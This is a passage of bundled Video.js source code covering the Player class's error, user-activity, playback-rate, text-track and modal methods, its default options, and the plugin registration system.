       * @type {EventTarget~Event}
       */
      this.trigger('usingcustomcontrols');
    }
  };

  /**
   * Set or get the current MediaError
   *
   * @fires Player#error
   *
   * @param  {MediaError|string|number} [err]
   *         A MediaError or a string/number to be turned
   *         into a MediaError
   *
   * @return {MediaError|null}
   *         The current MediaError when getting (or null)
   */


  Player.prototype.error = function error(err) {
    if (err === undefined) {
      return this.error_ || null;
    }

    // restoring to default
    if (err === null) {
      this.error_ = err;
      this.removeClass('vjs-error');
      if (this.errorDisplay) {
        this.errorDisplay.close();
      }
      return;
    }

    this.error_ = new MediaError(err);

    // add the vjs-error classname to the player
    this.addClass('vjs-error');

    // log the name of the error type and any message
    // ie8 just logs "[object object]" if you just log the error object
    log$1.error('(CODE:' + this.error_.code + ' ' + MediaError.errorTypes[this.error_.code] + ')', this.error_.message, this.error_);

    /**
     * @event Player#error
     * @type {EventTarget~Event}
     */
    this.trigger('error');

    return;
  };

  /**
   * Report user activity
   *
   * @param {Object} event
   *        Event object
   */


  Player.prototype.reportUserActivity = function reportUserActivity(event) {
    this.userActivity_ = true;
  };

  /**
   * Get/set if user is active
   *
   * @fires Player#useractive
   * @fires Player#userinactive
   *
   * @param {boolean} [bool]
   *        - true if the user is active
   *        - false if the user is inactive
   *
   * @return {boolean}
   *         The current value of userActive when getting
   */


  Player.prototype.userActive = function userActive(bool) {
    if (bool === undefined) {
      return this.userActive_;
    }

    bool = !!bool;

    if (bool === this.userActive_) {
      return;
    }

    this.userActive_ = bool;

    if (this.userActive_) {
      this.userActivity_ = true;
      this.removeClass('vjs-user-inactive');
      this.addClass('vjs-user-active');
      /**
       * @event Player#useractive
       * @type {EventTarget~Event}
       */
      this.trigger('useractive');
      return;
    }

    // Chrome/Safari/IE have bugs where when you change the cursor it can
    // trigger a mousemove event. This causes an issue when you're hiding
    // the cursor when the user is inactive, and a mousemove signals user
    // activity. Making it impossible to go into inactive mode. Specifically
    // this happens in fullscreen when we really need to hide the cursor.
    //
    // When this gets resolved in ALL browsers it can be removed
    // https://code.google.com/p/chromium/issues/detail?id=103041
    if (this.tech_) {
      this.tech_.one('mousemove', function (e) {
        e.stopPropagation();
        e.preventDefault();
      });
    }

    this.userActivity_ = false;
    this.removeClass('vjs-user-active');
    this.addClass('vjs-user-inactive');
    /**
     * @event Player#userinactive
     * @type {EventTarget~Event}
     */
    this.trigger('userinactive');
  };

  /**
   * Listen for user activity based on timeout value
   *
   * @private
   */


  Player.prototype.listenForUserActivity_ = function listenForUserActivity_() {
    var mouseInProgress = void 0;
    var lastMoveX = void 0;
    var lastMoveY = void 0;
    var handleActivity = bind(this, this.reportUserActivity);

    var handleMouseMove = function handleMouseMove(e) {
      // #1068 - Prevent mousemove spamming
      // Chrome Bug: https://code.google.com/p/chromium/issues/detail?id=366970
      if (e.screenX !== lastMoveX || e.screenY !== lastMoveY) {
        lastMoveX = e.screenX;
        lastMoveY = e.screenY;
        handleActivity();
      }
    };

    var handleMouseDown = function handleMouseDown() {
      handleActivity();
      // For as long as the they are touching the device or have their mouse down,
      // we consider them active even if they're not moving their finger or mouse.
      // So we want to continue to update that they are active
      this.clearInterval(mouseInProgress);
      // Setting userActivity=true now and setting the interval to the same time
      // as the activityCheck interval (250) should ensure we never miss the
      // next activityCheck
      mouseInProgress = this.setInterval(handleActivity, 250);
    };

    var handleMouseUp = function handleMouseUp(event) {
      handleActivity();
      // Stop the interval that maintains activity if the mouse/touch is down
      this.clearInterval(mouseInProgress);
    };

    // Any mouse movement will be considered user activity
    this.on('mousedown', handleMouseDown);
    this.on('mousemove', handleMouseMove);
    this.on('mouseup', handleMouseUp);

    // Listen for keyboard navigation
    // Shouldn't need to use inProgress interval because of key repeat
    this.on('keydown', handleActivity);
    this.on('keyup', handleActivity);

    // Run an interval every 250 milliseconds instead of stuffing everything into
    // the mousemove/touchmove function itself, to prevent performance degradation.
    // `this.reportUserActivity` simply sets this.userActivity_ to true, which
    // then gets picked up by this loop
    // http://ejohn.org/blog/learning-from-twitter/
    var inactivityTimeout = void 0;

    this.setInterval(function () {
      // Check to see if mouse/touch activity has happened
      if (!this.userActivity_) {
        return;
      }

      // Reset the activity tracker
      this.userActivity_ = false;

      // If the user state was inactive, set the state to active
      this.userActive(true);

      // Clear any existing inactivity timeout to start the timer over
      this.clearTimeout(inactivityTimeout);

      var timeout = this.options_.inactivityTimeout;

      if (timeout <= 0) {
        return;
      }

      // In <timeout> milliseconds, if no more activity has occurred the
      // user will be considered inactive
      inactivityTimeout = this.setTimeout(function () {
        // Protect against the case where the inactivityTimeout can trigger just
        // before the next user activity is picked up by the activity check loop
        // causing a flicker
        if (!this.userActivity_) {
          this.userActive(false);
        }
      }, timeout);
    }, 250);
  };

  /**
   * Gets or sets the current playback rate. A playback rate of
   * 1.0 represents normal speed and 0.5 would indicate half-speed
   * playback, for instance.
   *
   * @see https://html.spec.whatwg.org/multipage/embedded-content.html#dom-media-playbackrate
   *
   * @param {number} [rate]
   *       New playback rate to set.
   *
   * @return {number}
   *         The current playback rate when getting or 1.0
   */


  Player.prototype.playbackRate = function playbackRate(rate) {
    if (rate !== undefined) {
      // NOTE: this.cache_.lastPlaybackRate is set from the tech handler
      // that is registered above
      this.techCall_('setPlaybackRate', rate);
      return;
    }

    if (this.tech_ && this.tech_.featuresPlaybackRate) {
      return this.cache_.lastPlaybackRate || this.techGet_('playbackRate');
    }
    return 1.0;
  };

  /**
   * Gets or sets the current default playback rate. A default playback rate of
   * 1.0 represents normal speed and 0.5 would indicate half-speed playback, for instance.
   * defaultPlaybackRate will only represent what the intial playbackRate of a video was, not
   * not the current playbackRate.
   *
   * @see https://html.spec.whatwg.org/multipage/embedded-content.html#dom-media-defaultplaybackrate
   *
   * @param {number} [rate]
   *       New default playback rate to set.
   *
   * @return {number|Player}
   *         - The default playback rate when getting or 1.0
   *         - the player when setting
   */


  Player.prototype.defaultPlaybackRate = function defaultPlaybackRate(rate) {
    if (rate !== undefined) {
      return this.techCall_('setDefaultPlaybackRate', rate);
    }

    if (this.tech_ && this.tech_.featuresPlaybackRate) {
      return this.techGet_('defaultPlaybackRate');
    }
    return 1.0;
  };

  /**
   * Gets or sets the audio flag
   *
   * @param {boolean} bool
   *        - true signals that this is an audio player
   *        - false signals that this is not an audio player
   *
   * @return {boolean}
   *         The current value of isAudio when getting
   */


  Player.prototype.isAudio = function isAudio(bool) {
    if (bool !== undefined) {
      this.isAudio_ = !!bool;
      return;
    }

    return !!this.isAudio_;
  };

  /**
   * A helper method for adding a {@link TextTrack} to our
   * {@link TextTrackList}.
   *
   * In addition to the W3C settings we allow adding additional info through options.
   *
   * @see http://www.w3.org/html/wg/drafts/html/master/embedded-content-0.html#dom-media-addtexttrack
   *
   * @param {string} [kind]
   *        the kind of TextTrack you are adding
   *
   * @param {string} [label]
   *        the label to give the TextTrack label
   *
   * @param {string} [language]
   *        the language to set on the TextTrack
   *
   * @return {TextTrack|undefined}
   *         the TextTrack that was added or undefined
   *         if there is no tech
   */


  Player.prototype.addTextTrack = function addTextTrack(kind, label, language) {
    if (this.tech_) {
      return this.tech_.addTextTrack(kind, label, language);
    }
  };

  /**
   * Create a remote {@link TextTrack} and an {@link HTMLTrackElement}. It will
   * automatically removed from the video element whenever the source changes, unless
   * manualCleanup is set to false.
   *
   * @param {Object} options
   *        Options to pass to {@link HTMLTrackElement} during creation. See
   *        {@link HTMLTrackElement} for object properties that you should use.
   *
   * @param {boolean} [manualCleanup=true] if set to false, the TextTrack will be
   *
   * @return {HtmlTrackElement}
   *         the HTMLTrackElement that was created and added
   *         to the HtmlTrackElementList and the remote
   *         TextTrackList
   *
   * @deprecated The default value of the "manualCleanup" parameter will default
   *             to "false" in upcoming versions of Video.js
   */


  Player.prototype.addRemoteTextTrack = function addRemoteTextTrack(options, manualCleanup) {
    if (this.tech_) {
      return this.tech_.addRemoteTextTrack(options, manualCleanup);
    }
  };

  /**
   * Remove a remote {@link TextTrack} from the respective
   * {@link TextTrackList} and {@link HtmlTrackElementList}.
   *
   * @param {Object} track
   *        Remote {@link TextTrack} to remove
   *
   * @return {undefined}
   *         does not return anything
   */


  Player.prototype.removeRemoteTextTrack = function removeRemoteTextTrack() {
    var _ref3 = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {},
        _ref3$track = _ref3.track,
        track = _ref3$track === undefined ? arguments[0] : _ref3$track;

    // destructure the input into an object with a track argument, defaulting to arguments[0]
    // default the whole argument to an empty object if nothing was passed in

    if (this.tech_) {
      return this.tech_.removeRemoteTextTrack(track);
    }
  };

  /**
   * Gets available media playback quality metrics as specified by the W3C's Media
   * Playback Quality API.
   *
   * @see [Spec]{@link https://wicg.github.io/media-playback-quality}
   *
   * @return {Object|undefined}
   *         An object with supported media playback quality metrics or undefined if there
   *         is no tech or the tech does not support it.
   */


  Player.prototype.getVideoPlaybackQuality = function getVideoPlaybackQuality() {
    return this.techGet_('getVideoPlaybackQuality');
  };

  /**
   * Get video width
   *
   * @return {number}
   *         current video width
   */


  Player.prototype.videoWidth = function videoWidth() {
    return this.tech_ && this.tech_.videoWidth && this.tech_.videoWidth() || 0;
  };

  /**
   * Get video height
   *
   * @return {number}
   *         current video height
   */


  Player.prototype.videoHeight = function videoHeight() {
    return this.tech_ && this.tech_.videoHeight && this.tech_.videoHeight() || 0;
  };

  /**
   * The player's language code
   * NOTE: The language should be set in the player options if you want the
   * the controls to be built with a specific language. Changing the lanugage
   * later will not update controls text.
   *
   * @param {string} [code]
   *        the language code to set the player to
   *
   * @return {string}
   *         The current language code when getting
   */


  Player.prototype.language = function language(code) {
    if (code === undefined) {
      return this.language_;
    }

    this.language_ = String(code).toLowerCase();
  };

  /**
   * Get the player's language dictionary
   * Merge every time, because a newly added plugin might call videojs.addLanguage() at any time
   * Languages specified directly in the player options have precedence
   *
   * @return {Array}
   *         An array of of supported languages
   */


  Player.prototype.languages = function languages() {
    return mergeOptions(Player.prototype.options_.languages, this.languages_);
  };

  /**
   * returns a JavaScript object reperesenting the current track
   * information. **DOES not return it as JSON**
   *
   * @return {Object}
   *         Object representing the current of track info
   */


  Player.prototype.toJSON = function toJSON() {
    var options = mergeOptions(this.options_);
    var tracks = options.tracks;

    options.tracks = [];

    for (var i = 0; i < tracks.length; i++) {
      var track = tracks[i];

      // deep merge tracks and null out player so no circular references
      track = mergeOptions(track);
      track.player = undefined;
      options.tracks[i] = track;
    }

    return options;
  };

  /**
   * Creates a simple modal dialog (an instance of the {@link ModalDialog}
   * component) that immediately overlays the player with arbitrary
   * content and removes itself when closed.
   *
   * @param {string|Function|Element|Array|null} content
   *        Same as {@link ModalDialog#content}'s param of the same name.
   *        The most straight-forward usage is to provide a string or DOM
   *        element.
   *
   * @param {Object} [options]
   *        Extra options which will be passed on to the {@link ModalDialog}.
   *
   * @return {ModalDialog}
   *         the {@link ModalDialog} that was created
   */


  Player.prototype.createModal = function createModal(content, options) {
    var _this10 = this;

    options = options || {};
    options.content = content || '';

    var modal = new ModalDialog(this, options);

    this.addChild(modal);
    modal.on('dispose', function () {
      _this10.removeChild(modal);
    });

    modal.open();
    return modal;
  };

  /**
   * Gets tag settings
   *
   * @param {Element} tag
   *        The player tag
   *
   * @return {Object}
   *         An object containing all of the settings
   *         for a player tag
   */


  Player.getTagSettings = function getTagSettings(tag) {
    var baseOptions = {
      sources: [],
      tracks: []
    };

    var tagOptions = getAttributes(tag);
    var dataSetup = tagOptions['data-setup'];

    if (hasClass(tag, 'vjs-fluid')) {
      tagOptions.fluid = true;
    }

    // Check if data-setup attr exists.
    if (dataSetup !== null) {
      // Parse options JSON
      // If empty string, make it a parsable json object.
      var _safeParseTuple = tuple(dataSetup || '{}'),
          err = _safeParseTuple[0],
          data = _safeParseTuple[1];

      if (err) {
        log$1.error(err);
      }
      assign(tagOptions, data);
    }

    assign(baseOptions, tagOptions);

    // Get tag children settings
    if (tag.hasChildNodes()) {
      var children = tag.childNodes;

      for (var i = 0, j = children.length; i < j; i++) {
        var child = children[i];
        // Change case needed: http://ejohn.org/blog/nodename-case-sensitivity/
        var childName = child.nodeName.toLowerCase();

        if (childName === 'source') {
          baseOptions.sources.push(getAttributes(child));
        } else if (childName === 'track') {
          baseOptions.tracks.push(getAttributes(child));
        }
      }
    }

    return baseOptions;
  };

  /**
   * Determine wether or not flexbox is supported
   *
   * @return {boolean}
   *         - true if flexbox is supported
   *         - false if flexbox is not supported
   */


  Player.prototype.flexNotSupported_ = function flexNotSupported_() {
    var elem = document_1.createElement('i');

    // Note: We don't actually use flexBasis (or flexOrder), but it's one of the more
    // common flex features that we can rely on when checking for flex support.
    return !('flexBasis' in elem.style || 'webkitFlexBasis' in elem.style || 'mozFlexBasis' in elem.style || 'msFlexBasis' in elem.style ||
    // IE10-specific (2012 flex spec)
    'msFlexOrder' in elem.style);
  };

  return Player;
}(Component);

/**
 * Get the {@link VideoTrackList}
 * @link https://html.spec.whatwg.org/multipage/embedded-content.html#videotracklist
 *
 * @return {VideoTrackList}
 *         the current video track list
 *
 * @method Player.prototype.videoTracks
 */

/**
 * Get the {@link AudioTrackList}
 * @link https://html.spec.whatwg.org/multipage/embedded-content.html#audiotracklist
 *
 * @return {AudioTrackList}
 *         the current audio track list
 *
 * @method Player.prototype.audioTracks
 */

/**
 * Get the {@link TextTrackList}
 *
 * @link http://www.w3.org/html/wg/drafts/html/master/embedded-content-0.html#dom-media-texttracks
 *
 * @return {TextTrackList}
 *         the current text track list
 *
 * @method Player.prototype.textTracks
 */

/**
 * Get the remote {@link TextTrackList}
 *
 * @return {TextTrackList}
 *         The current remote text track list
 *
 * @method Player.prototype.remoteTextTracks
 */

/**
 * Get the remote {@link HtmlTrackElementList} tracks.
 *
 * @return {HtmlTrackElementList}
 *         The current remote text track element list
 *
 * @method Player.prototype.remoteTextTrackEls
 */

ALL.names.forEach(function (name$$1) {
  var props = ALL[name$$1];

  Player.prototype[props.getterName] = function () {
    if (this.tech_) {
      return this.tech_[props.getterName]();
    }

    // if we have not yet loadTech_, we create {video,audio,text}Tracks_
    // these will be passed to the tech during loading
    this[props.privateName] = this[props.privateName] || new props.ListClass();
    return this[props.privateName];
  };
});

/**
 * Global player list
 *
 * @type {Object}
 */
Player.players = {};

var navigator$1 = window_1.navigator;

/*
 * Player instance options, surfaced using options
 * options = Player.prototype.options_
 * Make changes in options, not here.
 *
 * @type {Object}
 * @private
 */
Player.prototype.options_ = {
  // Default order of fallback technology
  techOrder: Tech.defaultTechOrder_,

  html5: {},
  flash: {},

  // default inactivity timeout
  inactivityTimeout: 2000,

  // default playback rates
  playbackRates: [],
  // Add playback rate selection by adding rates
  // 'playbackRates': [0.5, 1, 1.5, 2],

  // Included control sets
  children: ['mediaLoader', 'posterImage', 'textTrackDisplay', 'loadingSpinner', 'bigPlayButton', 'controlBar', 'errorDisplay', 'textTrackSettings'],

  language: navigator$1 && (navigator$1.languages && navigator$1.languages[0] || navigator$1.userLanguage || navigator$1.language) || 'en',

  // locales and their language translations
  languages: {},

  // Default message to show when a video cannot be played.
  notSupportedMessage: 'No compatible source was found for this media.'
};

if (!IS_IE8) {
  Player.prototype.options_.children.push('resizeManager');
}

[
/**
 * Returns whether or not the player is in the "ended" state.
 *
 * @return {Boolean} True if the player is in the ended state, false if not.
 * @method Player#ended
 */
'ended',
/**
 * Returns whether or not the player is in the "seeking" state.
 *
 * @return {Boolean} True if the player is in the seeking state, false if not.
 * @method Player#seeking
 */
'seeking',
/**
 * Returns the TimeRanges of the media that are currently available
 * for seeking to.
 *
 * @return {TimeRanges} the seekable intervals of the media timeline
 * @method Player#seekable
 */
'seekable',
/**
 * Returns the current state of network activity for the element, from
 * the codes in the list below.
 * - NETWORK_EMPTY (numeric value 0)
 *   The element has not yet been initialised. All attributes are in
 *   their initial states.
 * - NETWORK_IDLE (numeric value 1)
 *   The element's resource selection algorithm is active and has
 *   selected a resource, but it is not actually using the network at
 *   this time.
 * - NETWORK_LOADING (numeric value 2)
 *   The user agent is actively trying to download data.
 * - NETWORK_NO_SOURCE (numeric value 3)
 *   The element's resource selection algorithm is active, but it has
 *   not yet found a resource to use.
 *
 * @see https://html.spec.whatwg.org/multipage/embedded-content.html#network-states
 * @return {number} the current network activity state
 * @method Player#networkState
 */
'networkState',
/**
 * Returns a value that expresses the current state of the element
 * with respect to rendering the current playback position, from the
 * codes in the list below.
 * - HAVE_NOTHING (numeric value 0)
 *   No information regarding the media resource is available.
 * - HAVE_METADATA (numeric value 1)
 *   Enough of the resource has been obtained that the duration of the
 *   resource is available.
 * - HAVE_CURRENT_DATA (numeric value 2)
 *   Data for the immediate current playback position is available.
 * - HAVE_FUTURE_DATA (numeric value 3)
 *   Data for the immediate current playback position is available, as
 *   well as enough data for the user agent to advance the current
 *   playback position in the direction of playback.
 * - HAVE_ENOUGH_DATA (numeric value 4)
 *   The user agent estimates that enough data is available for
 *   playback to proceed uninterrupted.
 *
 * @see https://html.spec.whatwg.org/multipage/embedded-content.html#dom-media-readystate
 * @return {number} the current playback rendering state
 * @method Player#readyState
 */
'readyState'].forEach(function (fn) {
  Player.prototype[fn] = function () {
    return this.techGet_(fn);
  };
});

TECH_EVENTS_RETRIGGER.forEach(function (event) {
  Player.prototype['handleTech' + toTitleCase(event) + '_'] = function () {
    return this.trigger(event);
  };
});

/**
 * Fired when the player has initial duration and dimension information
 *
 * @event Player#loadedmetadata
 * @type {EventTarget~Event}
 */

/**
 * Fired when the player has downloaded data at the current playback position
 *
 * @event Player#loadeddata
 * @type {EventTarget~Event}
 */

/**
 * Fired when the current playback position has changed *
 * During playback this is fired every 15-250 milliseconds, depending on the
 * playback technology in use.
 *
 * @event Player#timeupdate
 * @type {EventTarget~Event}
 */

/**
 * Fired when the volume changes
 *
 * @event Player#volumechange
 * @type {EventTarget~Event}
 */

/**
 * Reports whether or not a player has a plugin available.
 *
 * This does not report whether or not the plugin has ever been initialized
 * on this player. For that, [usingPlugin]{@link Player#usingPlugin}.
 *
 * @method Player#hasPlugin
 * @param  {string}  name
 *         The name of a plugin.
 *
 * @return {boolean}
 *         Whether or not this player has the requested plugin available.
 */

/**
 * Reports whether or not a player is using a plugin by name.
 *
 * For basic plugins, this only reports whether the plugin has _ever_ been
 * initialized on this player.
 *
 * @method Player#usingPlugin
 * @param  {string} name
 *         The name of a plugin.
 *
 * @return {boolean}
 *         Whether or not this player is using the requested plugin.
 */

Component.registerComponent('Player', Player);

/**
 * @file plugin.js
 */
/**
 * The base plugin name.
 *
 * @private
 * @constant
 * @type {string}
 */
var BASE_PLUGIN_NAME = 'plugin';

/**
 * The key on which a player's active plugins cache is stored.
 *
 * @private
 * @constant
 * @type     {string}
 */
var PLUGIN_CACHE_KEY = 'activePlugins_';

/**
 * Stores registered plugins in a private space.
 *
 * @private
 * @type    {Object}
 */
var pluginStorage = {};

/**
 * Reports whether or not a plugin has been registered.
 *
 * @private
 * @param   {string} name
 *          The name of a plugin.
 *
 * @returns {boolean}
 *          Whether or not the plugin has been registered.
 */
var pluginExists = function pluginExists(name) {
  return pluginStorage.hasOwnProperty(name);
};

/**
 * Get a single registered plugin by name.
 *
 * @private
 * @param   {string} name
 *          The name of a plugin.
 *
 * @returns {Function|undefined}
 *          The plugin (or undefined).
 */
var getPlugin = function getPlugin(name) {
  return pluginExists(name) ? pluginStorage[name] : undefined;
};

/**
 * Marks a plugin as "active" on a player.
 *
 * Also, ensures that the player has an object for tracking active plugins.
 *
 * @private
 * @param   {Player} player
 *          A Video.js player instance.
 *
 * @param   {string} name
 *          The name of a plugin.
 */
var markPluginAsActive = function markPluginAsActive(player, name) {
  player[PLUGIN_CACHE_KEY] = player[PLUGIN_CACHE_KEY] || {};
  player[PLUGIN_CACHE_KEY][name] = true;
};

/**
 * Triggers a pair of plugin setup events.
 *
 * @private
 * @param  {Player} player
 *         A Video.js player instance.
 *
 * @param  {Plugin~PluginEventHash} hash
 *         A plugin event hash.
 *
 * @param  {Boolean} [before]
 *         If true, prefixes the event name with "before". In other words,
 *         use this to trigger "beforepluginsetup" instead of "pluginsetup".
 */
var triggerSetupEvent = function triggerSetupEvent(player, hash, before) {
  var eventName = (before ? 'before' : '') + 'pluginsetup';

  player.trigger(eventName, hash);
  player.trigger(eventName + ':' + hash.name, hash);
};

/**
 * Takes a basic plugin function and returns a wrapper function which marks
 * on the player that the plugin has been activated.
 *
 * @private
 * @param   {string} name
 *          The name of the plugin.
 *
 * @param   {Function} plugin
 *          The basic plugin.
 *
 * @returns {Function}
 *          A wrapper function for the given plugin.
 */
var createBasicPlugin = function createBasicPlugin(name, plugin) {
  var basicPluginWrapper = function basicPluginWrapper() {

    // We trigger the "beforepluginsetup" and "pluginsetup" events on the player
    // regardless, but we want the hash to be consistent with the hash provided
    // for advanced plugins.
    //
    // The only potentially counter-intuitive thing here is the `instance` in
    // the "pluginsetup" event is the value returned by the `plugin` function.
    triggerSetupEvent(this, { name: name, plugin: plugin, instance: null }, true);

    var instance = plugin.apply(this, arguments);

    markPluginAsActive(this, name);
    triggerSetupEvent(this, { name: name, plugin: plugin, instance: instance });

    return instance;
  };

  Object.keys(plugin).forEach(function (prop) {
    basicPluginWrapper[prop] = plugin[prop];
  });

  return basicPluginWrapper;
};

/**
 * Takes a plugin sub-class and returns a factory function for generating
 * instances of it.
 *
 * This factory function will replace itself with an instance of the requested
 * sub-class of Plugin.
 *
 * @private
 * @param   {string} name
 *          The name of the plugin.
 *
 * @param   {Plugin} PluginSubClass
 *          The advanced plugin.
 *
 * @returns {Function}
 */
var createPluginFactory = function createPluginFactory(name, PluginSubClass) {

  // Add a `name` property to the plugin prototype so that each plugin can
  // refer to itself by name.
  PluginSubClass.prototype.name = name;

  return function () {
    triggerSetupEvent(this, { name: name, plugin: PluginSubClass, instance: null }, true);

    for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
      args[_key] = arguments[_key];
    }

    var instance = new (Function.prototype.bind.apply(PluginSubClass, [null].concat([this].concat(args))))();

    // The plugin is replaced by a function that returns the current instance.
    this[name] = function () {
      return instance;
    };

    triggerSetupEvent(this, instance.getEventHash());

    return instance;
  };
};

/**
 * Parent class for all advanced plugins.
 *
 * @mixes   module:evented~EventedMixin
 * @mixes   module:stateful~StatefulMixin
 * @fires   Player#beforepluginsetup
 * @fires   Player#beforepluginsetup:$name
 * @fires   Player#pluginsetup
 * @fires   Player#pluginsetup:$name
 * @listens Player#dispose
 * @throws  {Error}
 *          If attempting to instantiate the base {@link Plugin} class
 *          directly instead of via a sub-class.
 */

var Plugin = function () {

  /**
   * Creates an instance of this class.
   *
   * Sub-classes should call `super` to ensure plugins are properly initialized.
   *
   * @param {Player} player
   *        A Video.js player instance.
   */
  function Plugin(player) {
    classCallCheck(this, Plugin);

    if (this.constructor === Plugin) {
      throw new Error('Plugin must be sub-classed; not directly instantiated.');
    }

    this.player = player;

    // Make this object evented, but remove the added `trigger` method so we
    // use the prototype version instead.
    evented(this);
    delete this.trigger;

    stateful(this, this.constructor.defaultState);
    markPluginAsActive(player, this.name);

    // Auto-bind the dispose method so we can use it as a listener and unbind
    // it later easily.
    this.dispose = bind(this, this.dispose);

    // If the player is disposed, dispose the plugin.
    player.on('dispose', this.dispose);
  }

  /**
   * Get the version of the plugin that was set on <pluginName>.VERSION
   */


  Plugin.prototype.version = function version() {
    return this.constructor.VERSION;
  };

  /**
   * Each event triggered by plugins includes a hash of additional data with
   * conventional properties.
   *
   * This returns that object or mutates an existing hash.
   *
   * @param   {Object} [hash={}]
   *          An object to be used as event an event hash.
   *
   * @returns {Plugin~PluginEventHash}
   *          An event hash object with provided properties mixed-in.
   */


  Plugin.prototype.getEventHash = function getEventHash() {
    var hash = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

    hash.name = this.name;
    hash.plugin = this.constructor;
    hash.instance = this;
    return hash;
  };

  /**
   * Triggers an event on the plugin object and overrides
   * {@link module:evented~EventedMixin.trigger|EventedMixin.trigger}.
   *
   * @param   {string|Object} event
   *          An event type or an object with a type property.
   *
   * @param   {Object} [hash={}]
   *          Additional data hash to merge with a
   *          {@link Plugin~PluginEventHash|PluginEventHash}.
   *
   * @returns {boolean}
   *          Whether or not default was prevented.
   */


  Plugin.prototype.trigger = function trigger$$1(event) {
    var hash = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

    return trigger(this.eventBusEl_, event, this.getEventHash(hash));
  };

  /**
   * Handles "statechanged" events on the plugin. No-op by default, override by
   * subclassing.
   *
   * @abstract
   * @param    {Event} e
   *           An event object provided by a "statechanged" event.
   *
   * @param    {Object} e.changes
   *           An object describing changes that occurred with the "statechanged"
   *           event.
   */


  Plugin.prototype.handleStateChanged = function handleStateChanged(e) {};

  /**
   * Disposes a plugin.
   *
   * Subclasses can override this if they want, but for the sake of safety,
   * it's probably best to subscribe the "dispose" event.
   *
   * @fires Plugin#dispose
   */


  Plugin.prototype.dispose = function dispose() {
    var name = this.name,
        player = this.player;

    /**
     * Signals that a advanced plugin is about to be disposed.
     *
     * @event Plugin#dispose
     * @type  {EventTarget~Event}
     */

    this.trigger('dispose');
    this.off();
    player.off('dispose', this.dispose);

    // Eliminate any possible sources of leaking memory by clearing up
    // references between the player and the plugin instance and nulling out
    // the plugin's state and replacing methods with a function that throws.
    player[PLUGIN_CACHE_KEY][name] = false;
    this.player = this.state = null;

    // Finally, replace the plugin name on the player with a new factory
    // function, so that the plugin is ready to be set up again.
    player[name] = createPluginFactory(name, pluginStorage[name]);
  };

  /**
   * Determines if a plugin is a basic plugin (i.e. not a sub-class of `Plugin`).
   *
   * @param   {string|Function} plugin
   *          If a string, matches the name of a plugin. If a function, will be
   *          tested directly.
   *
   * @returns {boolean}
   *          Whether or not a plugin is a basic plugin.
   */


  Plugin.isBasic = function isBasic(plugin) {
    var p = typeof plugin === 'string' ? getPlugin(plugin) : plugin;

    return typeof p === 'function' && !Plugin.prototype.isPrototypeOf(p.prototype);
  };

  /**
   * Register a Video.js plugin.
   *
   * @param   {string} name
   *          The name of the plugin to be registered. Must be a string and
   *          must not match an existing plugin or a method on the `Player`
   *          prototype.
   *
   * @param   {Function} plugin
   *          A sub-class of `Plugin` or a function for basic plugins.
   *
   * @returns {Function}
   *          For advanced plugins, a factory function for that plugin. For
   *          basic plugins, a wrapper function that initializes the plugin.
   */


  Plugin.registerPlugin = function registerPlugin(name, plugin) {
    if (typeof name !== 'string') {
      throw new Error('Illegal plugin name, "' + name + '", must be a string, was ' + (typeof name === 'undefined' ? 'undefined' : _typeof(name)) + '.');
    }

    if (pluginExists(name)) {
      log$1.warn('A plugin named "' + name + '" already exists. You may want to avoid re-registering plugins!');
    } else if (Player.prototype.hasOwnProperty(name)) {
      throw new Error('Illegal plugin name, "' + name + '", cannot share a name with an existing player method!');
    }

    if (typeof plugin !== 'function') {
      throw new Error('Illegal plugin for "' + name + '", must be a function, was ' + (typeof plugin === 'undefined' ? 'undefined' : _typeof(plugin)) + '.');
    }

    pluginStorage[name] = plugin;

    // Add a player prototype method for all sub-classed plugins (but not for
    // the base Plugin class).
    if (name !== BASE_PLUGIN_NAME) {
      if (Plugin.isBasic(plugin)) {
        Player.prototype[name] = createBasicPlugin(name, plugin);
      } else {
        Player.prototype[name] = createPluginFactory(name, plugin);
      }
    }

    return plugin;
  };

  /**
   * De-register a Video.js plugin.
   *
   * @param {string} name
   *        The name of the plugin to be deregistered.
   */


  Plugin.deregisterPlugin = function deregisterPlugin(name) {
    if (name === BASE_PLUGIN_NAME) {
      throw new Error('Cannot de-register base plugin.');
    }
    if (pluginExists(name)) {
      delete pluginStorage[name];
      delete Player.prototype[name];
    }
  };

  /**
   * Gets an object containing multiple Video.js plugins.
   *
   * @param   {Array} [names]
   *          If provided, should be an array of plugin names. Defaults to _all_
   *          plugin names.
   *
   * @returns {Object|undefined}
   *          An object containing plugin(s) associated with their name(s) or
   *          `undefined` if no matching plugins exist).
   */


  Plugin.getPlugins = function getPlugins() {
    var names = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : Object.keys(pluginStorage);

    var result = void 0;

    names.forEach(function (name) {
      var plugin = getPlugin(name);

      if (plugin) {
        result = result || {};
        result[name] = plugin;
      }
    });

    return result;
  };

  /**
   * Gets a plugin's version, if available
   *
   * @param   {string} name
   *          The name of a plugin.
   *
   * @returns {string}
   *          The plugin's version or an empty string.
   */


  Plugin.getPluginVersion = function getPluginVersion(name) {
    var plugin = getPlugin(name);

    return plugin && plugin.VERSION || '';
  };

  return Plugin;
}();

/**
 * Gets a plugin by name if it exists.
 *
 * @static
 * @method   getPlugin
 * @memberOf Plugin
 * @param    {string} name
 *           The name of a plugin.
 *
 * @returns  {Function|undefined}
 *           The plugin (or `undefined`).
 */


Plugin.getPlugin = getPlugin;

/**
 * The name of the base plugin class as it is registered.
 *
 * @type {string}
 */
Plugin.BASE_PLUGIN_NAME = BASE_PLUGIN_NAME;

Plugin.registerPlugin(BASE_PLUGIN_NAME, Plugin);

/**
 * Documented in player.js
 *
 * @ignore
 */
Player.prototype.usingPlugin = function (name) {
  return !!this[PLUGIN_CACHE_KEY] && this[PLUGIN_CACHE_KEY][name] === true;
};

/**
 * Documented in player.js
 *
 * @ignore
 */
Player.prototype.hasPlugin = function (name) {
  return !!pluginExists(name);
};

/**
 * Signals that a plugin is about to be set up on a player.
 *
 * @event    Player#beforepluginsetup
 * @type     {Plugin~PluginEventHash}
 */

/**
 * Signals that a plugin is about to be set up on a player - by name. The name
 * is the name of the plugin.
 *
 * @event    Player#beforepluginsetup:$name
 * @type     {Plugin~PluginEventHash}
 */

/**
 * Signals that a plugin has just been set up on a player.
 *
 * @event    Player#pluginsetup
 * @type     {Plugin~PluginEventHash}
 */

/**
 * Signals that a plugin has just been set up on a player - by name. The name
 * is the name of the plugin.
